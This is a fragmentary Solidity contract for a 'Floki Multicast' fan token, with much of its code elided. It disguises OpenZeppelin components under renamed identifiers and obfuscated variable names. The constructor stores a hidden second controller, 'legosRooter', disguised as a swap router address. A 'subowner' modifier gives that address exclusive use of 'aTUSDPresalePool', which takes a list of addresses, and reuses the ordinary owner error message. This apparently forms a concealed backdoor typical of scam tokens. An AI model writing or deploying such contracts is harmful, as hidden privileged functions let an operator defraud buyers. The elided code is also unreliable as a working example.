...
/// https://x.com/FlokiMulticast


pragma solidity 0.8.29;

// FlokiMulticast fan token

interface FlokiMulticastinterface {
  /**
...
/*
 * @dev Provides information about the current execution FlokiMulticast20Burnable, including the
 ...
 */
abstract contract FlokiMulticast20Burnable {
...
// File: @openzeppelin/contracts/access/FlokiMulticast20Ownable.sol
 ...
 * the owner.
 */
abstract contract FlokiMulticast20Ownable is FlokiMulticast20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "FlokiMulticast20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "FlokiMulticast20Ownable: new owner is the zero address");
 ...
 * `SafeFlokiMulticast` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeFlokiMulticast {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeFlokiMulticast: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeFlokiMulticast: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeFlokiMulticast: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeFlokiMulticast: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeFlokiMulticast: modulo by zero");
  }
...
contract FlokiMulticastToken is FlokiMulticast20Burnable, FlokiMulticastinterface, FlokiMulticast20Ownable {
    
    using SafeFlokiMulticast for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Floki Multicast";
        _symbol = "Floki Multicast";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {FlokiMulticastinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {FlokiMulticastinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "FlokiMulticast20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {FlokiMulticastinterface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {FlokiMulticastinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {FlokiMulticastinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {FlokiMulticastinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {FlokiMulticastinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "FlokiMulticastinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {FlokiMulticastinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "FlokiMulticastinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "FlokiMulticastinterface: transfer from the zero address");
        require(shippingto != address(0), "FlokiMulticastinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "FlokiMulticastinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "FlokiMulticastinterface: approve from the zero address");
        require(transporteur != address(0), "FlokiMulticastinterface: approve to the zero address");
